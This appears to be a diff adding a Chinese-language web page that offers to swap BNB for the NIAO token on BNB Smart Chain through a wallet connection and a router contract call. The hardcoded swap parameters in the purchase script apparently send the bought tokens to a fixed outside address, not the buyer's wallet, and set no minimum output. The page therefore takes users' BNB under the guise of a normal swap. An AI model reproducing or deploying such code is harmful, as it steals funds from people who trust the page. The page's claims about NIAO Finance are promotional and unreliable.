@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <link rel="icon" href="niao.jpg" type="image/jpeg">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BNB to NIAO Swap</title>
+    <script async src="https://platform.x.com/widgets.js"></script>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🦜</text></svg>">
+</head>
+<body>
+    <div class="niao-panel">
+        <!-- Header -->
+        <div class="header">
+            <img src="niao.jpg" alt="NIAO Coin Logo" class="logo">
+            <h1>BNB to NIAO Swap</h1>
+        </div>
+
+        <!-- Swap Section -->
+        <div class="swap-section">
+            <button id="connectWallet" class="connectBtn">连接钱包</button>
+            <div class="input-group">
+                <label>输入 BNB 数量</label>
+                <input type="number" id="bnbAmount" placeholder="0.0" step="0.01" min="0" disabled>
+            </div>
+            <div class="exchange-info" id="exchangeInfo">
+                预计可获得: 0 NIAO
+            </div>
+            <div class="input-group">
+                <label>预计获得 NIAO</label>
+                <input type="number" id="niaoAmount" placeholder="0.0" disabled>
+            </div>
+            <button id="swapButton" class="swapBtn" disabled>购买 NIAO</button>
+        </div>
+
+        <!-- Info Section -->
+        <div class="info-section">
+            <h2>关于 NIAO Coin</h2>
+            <p>
+                NIAO币是NIAO Finance平台的原生代币，运行于BNB Smart Chain（BSC），是一个领先的去中心化金融（DeFi）生态系统。自2021年推出以来，NIAO币为用户提供了创新的金融工具和治理参与机会，致力于打造安全、透明、用户友好的金融服务。
+            </p>
+            <p>
+                NIAO币在生态系统中扮演核心角色：
+                <ol>
+                    <li><strong>治理</strong>：持有者可参与决策，投票塑造平台未来。</li>
+                    <li><strong>质押</strong>：通过质押NIAO币赚取奖励，增强网络安全。</li>
+                    <li><strong>交易费用</strong>：支付平台费用，确保高效交易体验。</li>
+                </ol>
+            </p>
+        </div>
+
+        <!-- Chart Section -->
+        <div class="chart-section">
+            <h3>NIAO 实时图表</h3>
+            <iframe 
+                src="https://dexscreener.com/bsc/0xde6e12bdb2062dc48b409f0086219464a0c317a0?embed=1&trades=0&info=0" 
+                width="100%" 
+                height="400" 
+                frameborder="0">
+            </iframe>
+        </div>
+
+        <!-- X Updates Section -->
+        <div class="x-updates">
+            <div class="tweet-header">
+                <img src="111.jpg" alt="@NIAOBGE Avatar">
+                <h3>最新推文 <a href="https://x.com/NIAOBGE" target="_blank">@NIAOBGE</a></h3>
+            </div>
+            <div class="latest-tweet">
+                <blockquote class="twitter-tweet">
+                    <p lang="zh" dir="ltr">以后哪个兄弟拿鸟币来抽奖<br>只要是真抽<br>我全部都会评论点赞转发给大家引流</p>
+                    — NIAOBGE (@NIAOBGE) <a href="https://twitter.com/NIAOBGE/status/1834566141830569984">February 23, 2025</a>
+                </blockquote>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.4/dist/web3.min.js"></script>
+    <script>
+        let web3;
+        let account;
+        const niaoTokenId = '0xde6e12bdb2062dc48b409f0086219464a0c317a0';
+        const contractAddress = '0x1A0A18AC4BECDDbd6389559687d1A73d8927E416';
+
+        // 路由合约 ABI
+        const routerAbi = [{
+            "constant": true,
+            "inputs": [
+                {"name": "param_bytes_1", "type": "bytes"},
+                {"name": "param_bytes[]_2", "type": "bytes[]"},
+                {"name": "param_uint256_3", "type": "uint256"}
+            ],
+            "name": "execute",
+            "outputs": [],
+            "payable": true,
+            "stateMutability": "payable",
+            "type": "function"
+        }];
+
+        // 初始化 Web3，连接 BSC 网络
+        async function initWeb3() {
+            if (window.ethereum) {
+                web3 = new Web3(window.ethereum);
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x38' }], // BSC Mainnet chainId: 56 (hex: 0x38)
+                });
+            } else {
+                alert('请安装 MetaMask!');
+            }
+        }
+
+        // 获取兑换率
+        async function getExchangeRate() {
+            try {
+                const response = await fetch(
+                    `https://api.coingecko.com/api/v3/simple/token_price/binance-smart-chain?contract_addresses=${niaoTokenId}&vs_currencies=bnb`
+                );
+                const data = await response.json();
+                return data[niaoTokenId.toLowerCase()].bnb;
+            } catch (error) {
+                console.error('获取兑换率失败:', error);
+                return null;
+            }
+        }
+
+        // 连接钱包
+        document.getElementById('connectWallet').addEventListener('click', async () => {
+            await initWeb3();
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                account = accounts[0];
+                document.getElementById('connectWallet').textContent = `已连接: ${account.slice(0, 6)}...${account.slice(-4)}`;
+                document.getElementById('connectWallet').disabled = true;
+                document.getElementById('bnbAmount').disabled = false;
+                document.getElementById('swapButton').disabled = false;
+            } catch (error) {
+                console.error('连接钱包失败:', error);
+                alert('连接钱包失败');
+            }
+        });
+
+        // 更新预计 NIAO 数量
+        document.getElementById('bnbAmount').addEventListener('input', async (e) => {
+            const bnbAmount = parseFloat(e.target.value) || 0;
+            const exchangeRate = await getExchangeRate();
+            if (exchangeRate) {
+                const niaoAmount = bnbAmount / exchangeRate;
+                document.getElementById('niaoAmount').value = niaoAmount.toFixed(6);
+                document.getElementById('exchangeInfo').textContent = `预计可获得: ${niaoAmount.toFixed(6)} NIAO`;
+            } else {
+                document.getElementById('exchangeInfo').textContent = '无法获取兑换率';
+                document.getElementById('niaoAmount').value = '';
+            }
+        });
+
+        // 执行购买
+        document.getElementById('swapButton').addEventListener('click', async () => {
+            const bnbAmount = parseFloat(document.getElementById('bnbAmount').value);
+            if (!bnbAmount || bnbAmount <= 0) {
+                alert('请输入有效的 BNB 数量');
+                return;
+            }
+
+            const amountWei = web3.utils.toWei(bnbAmount.toString(), 'ether');
+            const deadline = Math.floor(Date.now() / 1000) + 600;
+
+            const paramBytes1 = "0x0b00";
+            const paramBytes2 = [
+                "0x0000000000000000000000000000000000000000000000000000000000000002" + web3.utils.padLeft(web3.utils.numberToHex(amountWei), 64).slice(2),
+                "0x000000000000000000000000f96a75300bbfa5462136a00ef0e4629f14500e5c" + 
+                web3.utils.padLeft(web3.utils.numberToHex(amountWei), 64).slice(2) + 
+                "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002bbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c002710de6e12bdb2062dc48b409f0086219464a0c317a0000000000000000000000000000000000000000000"
+            ];
+
+            try {
+                const contract = new web3.eth.Contract(routerAbi, contractAddress);
+                const tx = await contract.methods.execute(
+                    paramBytes1,
+                    paramBytes2,
+                    deadline
+                ).send({
+                    from: account,
+                    value: amountWei,
+                    gas: 200000,
+                    gasPrice: web3.utils.toWei('3', 'gwei')
+                });
+
+                alert(`交易成功！交易哈希: ${tx.transactionHash}`);
+            } catch (error) {
+                console.error('交易失败:', error);
+                alert(`交易失败: ${error.message}`);
+            }
+        });
+    </script>
+</body>
+</html>
